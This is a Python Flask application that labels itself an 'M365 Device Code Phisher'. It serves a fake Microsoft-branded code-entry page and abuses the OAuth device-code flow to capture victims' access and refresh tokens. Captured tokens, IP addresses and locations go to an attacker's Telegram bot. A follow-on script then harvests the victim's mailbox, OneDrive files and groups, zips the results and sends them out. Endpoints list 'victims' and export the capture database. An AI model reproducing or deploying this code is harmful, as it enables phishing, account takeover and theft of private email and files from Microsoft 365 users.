from flask import Flask, request, redirect, send_file, url_for, render_template_string, jsonify
import sqlite3
import datetime
import json
import requests
import secrets
import os
import time
import threading
import shutil
import random
import subprocess
import sys
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

DB_NAME = "logs.db"
HTML_PATH = "templates/index.html"
Task_DIR = "Tasks"

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

CLIENT_IDS = [
    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Azure CLI
    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Visual Studio
    "872cd9fa-d31c-45c9-824e-b321b0e850cc",  # Power BI
]

DEVICE_CODE_URL = "https://www.office.com/login/common/oauth2/v2.0/devicecode"
TOKEN_URL = "https://www.office.com/login/common/oauth2/v2.0/token"


# Override production settings
IS_PRODUCTION = os.getenv('FLASK_ENV') == 'production'

if IS_PRODUCTION:
    # Disable debug features
    app.debug = False
    
    # Use file-based logging instead of print statements
    import logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler('logs/app.log'),
            logging.StreamHandler()
        ]
    )
    
    # Suppress Flask development server warning
    import warnings
    warnings.filterwarnings('ignore', category=UserWarning, module='flask')

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS device_captures (
                 id INTEGER PRIMARY KEY,
                 timestamp TEXT,
                 user_code TEXT,
                 device_code TEXT,
                 email TEXT,
                 access_token TEXT,
                 refresh_token TEXT,
                 expires_in INTEGER,
                 ip TEXT,
                 location TEXT,
                 ua TEXT,
                 client_id TEXT,
                 success INTEGER)''')
    conn.commit()
    conn.close()

def get_client_ip():
    return (request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.remote_addr)

def get_location(ip):
    if not ip or ip in ['127.0.0.1', '::1', 'localhost']:
        return {"city": "Local", "country": "Local"}
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city", timeout=5)
        data = r.json()
        if data.get("status") == "success":
            return data
    except:
        pass
    return {"city": "Unknown", "country": "Unknown"}

def get_random_ua():
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
    ]
    return random.choice(uas)

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

def send_telegram_document(filename, caption):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, timeout=30)
        os.remove(filename)
    except:
        pass

def test_token_capabilities(access_token, email):
    headers = {'Authorization': f'Bearer {access_token}'}
    tests = [
        ('me', 'Profile'),
        ('me/mailFolders/Inbox/messages?$top=1', 'Email'),
        ('me/drive/root/children?$top=1', 'OneDrive')
    ]
    
    results = []
    for endpoint, name in tests:
        try:
            r = requests.get(f"https://graph.microsoft.com/v1.0/{endpoint}", headers=headers, timeout=10)
            if r.status_code == 200:
                results.append(f"{name}")
        except:
            pass
    
    if results:
        send_telegram_message(f"<b>{email}</b> access: {' | '.join(results)}")

def Task_tokens(access_token, refresh_token, email):
    """Execute M365 TASK toolkit with captured tokens"""
    try:
        # Create token JSON file
        token_data = {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "email": email,
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        safe_email = email.split('@')[0].replace('@', '_').replace('.', '_')
        token_filename = f"captured_tokens_{safe_email}_{int(time.time())}.json"
        with open(token_filename, 'w') as f:
            json.dump(token_data, f, indent=2)
        
        # Telegram notification
        Task_msg = f"""
<b> TASK STARTED</b>

<code>{email}</code>
<code>{token_filename}</code>

<i>Token TASK toolkit launched automatically...</i>
        """
        send_telegram_message(Task_msg)
        
        # Run script.py asynchronously
        Task_dir = f"{Task_DIR}/{safe_email}"
        os.makedirs(Task_dir, exist_ok=True)
        
        cmd = [
            sys.executable, "script.py",
            "--token-file", token_filename,
            "--output-dir", Task_dir,
            "--verbose"
        ]
        
        def run_Task():
            try:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=300,  # 5 min timeout
                    cwd=Task_dir
                )
                
                if result.returncode == 0:
                    # Count results
                    files = os.listdir(Task_dir)
                    email_count = len([f for f in files if 'email' in f.lower()])
                    file_count = len([f for f in files if 'file' in f.lower()])
                    
                    # Send success + summary
                    summary_msg = f"""
 <b>TASK COMPLETE: {email}</b> 

Results in: <code>{Task_dir}</code>
Summary:
Sensitive emails: <b>{email_count}</b>
Files found: <b>{file_count}</b>
Groups/Teams: Enumerated

<code>{token_filename}</code> → Full M365 access
                    """
                    send_telegram_message(summary_msg)
                    
                    # Zip results and send
                    zip_filename = f"{Task_dir}_results.zip"
                    shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', Task_dir)
                    send_telegram_document(zip_filename, f"Full results: {email}")
                    
                else:
                    error_msg = f"Task failed for <code>{email}</code>\n<pre>{result.stderr[:1000]}</pre>"
                    send_telegram_message(error_msg)
                    
            except subprocess.TimeoutExpired:
                send_telegram_message(f"Task timeout for <code>{email}</code>")
            except Exception as e:
                send_telegram_message(f"Task error <code>{email}</code>: {str(e)}")
        
        # Start TASK in daemon thread
        threading.Thread(target=run_Task, daemon=True).start()
        
        print(f"TASK launched: {email} → {token_filename}")
        
    except Exception as e:
        print(f"Task launch failed: {e}")
        send_telegram_message(f"Task setup failed for <code>{email}</code>: {str(e)}")

def poll_for_tokens(device_code, user_code, ip, location, ua, client_id, max_attempts=60):
    data = {
        'client_id': client_id,
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
        'device_code': device_code
    }

    for attempt in range(max_attempts):
        try:
            headers = {'User-Agent': get_random_ua()}
            resp = requests.post(TOKEN_URL, data=data, headers=headers, timeout=15)
            result = resp.json()

            if 'access_token' in result:
                email = (result.get('id_token_claims', {}).get('email') or 
                        result.get('id_token_claims', {}).get('preferred_username') or "Unknown")

                success_msg = f"""
<b>Task SUCCESS!</b> 

<code>{email}</code>
<code>{user_code}</code>

{ip}  {location.get('city')}, {location.get('country')}
{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>Tokens captured → TASK launched!</b>
                """
                send_telegram_message(success_msg)

                # LAUNCH TASK IMMEDIATELY
                threading.Thread(
                    target=Task_tokens, 
                    args=(result.get('access_token'), result.get('refresh_token'), email),
                    daemon=True
                ).start()

                # Test capabilities
                threading.Thread(target=test_token_capabilities, args=(result.get('access_token'), email), daemon=True).start()

                # Store tokens
                token_data = {
                    'timestamp': datetime.datetime.now().isoformat(),
                    'email': email,
                    'user_code': user_code,
                    'access_token': result.get('access_token'),
                    'refresh_token': result.get('refresh_token'),
                    'expires_in': result.get('expires_in'),
                    'scope': result.get('scope'),
                    'ip': ip,
                    'location': location,
                    'ua': ua,
                    'client_id': client_id
                }

                filename = f"tokens_{email.split('@')[0]}_{int(time.time())}.json"
                with open(filename, 'w') as f:
                    json.dump(token_data, f, indent=2)
                send_telegram_document(filename, f"Tokens: {email}")

                # DB storage
                conn = sqlite3.connect(DB_NAME)
                conn.execute("""INSERT INTO device_captures 
                    (timestamp, user_code, device_code, email, access_token, refresh_token, expires_in, ip, location, ua, client_id, success)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                    (datetime.datetime.now().isoformat(), user_code, device_code, email,
                     result.get('access_token'), result.get('refresh_token'), result.get('expires_in'),
                     ip, json.dumps(location), ua, client_id, 1))
                conn.commit()
                conn.close()

                print(f"SUCCESS + Task: {email} -> {filename}")
                return

            elif result.get('error') == 'authorization_pending':
                time.sleep(5)
                continue
            elif result.get('error') == 'expired_token':
                print(f"Expired: {user_code}")
                return

        except Exception as e:
            time.sleep(5)

    print(f"Timeout: {user_code}")

@app.route('/')
def index():
    if os.path.exists(HTML_PATH):
        return send_file(HTML_PATH)
    return send_file('index.html')

@app.route('/start', methods=['POST'])
def start_device_flow():
    ip = get_client_ip()
    ua = request.headers.get('User-Agent', '')
    location = get_location(ip)
    client_id = random.choice(CLIENT_IDS)

    try:
        payload = {
            'client_id': client_id,
            'scope': 'openid profile offline_access https://graph.microsoft.com/.default'
        }

        resp = requests.post(DEVICE_CODE_URL, data=payload, timeout=15, headers={'User-Agent': get_random_ua()})
        data = resp.json()

        user_code = data.get('user_code')
        device_code = data.get('device_code')
        verification_uri = data.get('verification_uri')

        if not user_code or not device_code:
            return "Error", 500

        message = f"""
    <b>New Device Code</b>

<code>{user_code}</code>
<a href="{verification_uri}">{verification_uri}</a>

 {ip}  {location.get('city')}, {location.get('country')}
 {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        send_telegram_message(message)

        threading.Thread(target=poll_for_tokens, args=(device_code, user_code, ip, location, ua, client_id), daemon=True).start()

        return render_template_string('''
<!DOCTYPE html>
<html><head><title>Microsoft - Enter code</title>
<style>body{font-family:Segoe UI,sans-serif;background:#f3f2f1;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;}
.card{background:white;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:420px;text-align:center;}
.code{font-size:42px;letter-spacing:8px;font-weight:700;background:#f8f8f8;padding:20px;border-radius:8px;margin:20px 0;}
.logo{width:100px;margin-bottom:20px;}</style></head>
<body><div class="card">
<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">
<h2>Enter this code</h2><p>Go to <strong>microsoft.com/devicelogin</strong> and enter:</p>
<div class="code">{{ user_code }}</div>
<p style="font-size:14px;"><strong>{{ verification_uri }}</strong></p>
<p style="color:#666;font-size:14px;">Expires in 60 minutes</p>
</div></body></html>
        ''', user_code=user_code, verification_uri=verification_uri)

    except Exception as e:
        print(f"Error: {e}")
        return redirect(url_for('index'))

@app.route('/stats')
def stats():
    conn = sqlite3.connect(DB_NAME)
    total = conn.execute("SELECT COUNT(*) FROM device_captures").fetchone()[0]
    success = conn.execute("SELECT COUNT(*) FROM device_captures WHERE success=1").fetchone()[0]
    recent = conn.execute("SELECT * FROM device_captures ORDER BY timestamp DESC LIMIT 5").fetchall()
    conn.close()
    
    stats = {
        'total': total,
        'success': success,
        'success_rate': round((success/total*100), 1) if total else 0,
        'recent': []
    }
    
    for row in recent:
        stats['recent'].append({
            'email': row[4],
            'ip': row[8],
            'timestamp': row[1],
            'success': bool(row[12])
        })
    
    return jsonify(stats)

@app.route('/db')
def download_db():
    return send_file(DB_NAME, as_attachment=True, download_name="device_captures.db")

@app.route('/export')
def export_json():
    """Export ALL captures as JSON"""
    conn = sqlite3.connect(DB_NAME)
    rows = conn.execute("SELECT * FROM device_captures ORDER BY timestamp DESC").fetchall()
    conn.close()
    
    data = []
    for row in rows:
        data.append({
            'id': row[0],
            'timestamp': row[1],
            'user_code': row[2],
            'device_code': row[3],
            'email': row[4],
            'access_token': row[5][:50] + '...' if row[5] else None,
            'refresh_token': row[6][:50] + '...' if row[6] else None,
            'ip': row[8],
            'success': bool(row[12])
        })
    
    response = jsonify({'captures': data})
    response.headers["Content-Disposition"] = "attachment; filename=captures_export.json"
    return response

@app.route('/Tasks')
def Tasks_index():
    """List all TASK results"""
    if not os.path.exists(Task_DIR):
        return jsonify({"error": "No Tasks found"}), 404
    
    victims = []
    for victim_dir in os.listdir(Task_DIR):
        victim_path = os.path.join(Task_DIR, victim_dir)
        if os.path.isdir(victim_path):
            files = os.listdir(victim_path)
            victims.append({
                "victim": victim_dir,
                "files": len(files),
                "size": sum(os.path.getsize(os.path.join(victim_path, f)) for f in files)
            })
    
    return jsonify({"victims": victims})

if __name__ == '__main__':
    os.makedirs(Task_DIR, exist_ok=True)
    init_db()
    print("M365 Device Code Phisher + Auto-TASK v3.0")
    print("http://0.0.0.0:5000/           # Landing page")
    print("http://0.0.0.0:5000/stats      # Live stats JSON")
    print("http://0.0.0.0:5000/db         # Full DB download")
    print("http://0.0.0.0:5000/export     # JSON export")
    print("http://0.0.0.0:5000/Tasks   # TASK results")
    print(f"DB: {DB_NAME} | 📁 Tasks: {Task_DIR}/")
    app.run(host='0.0.0.0', port=5000, debug=False)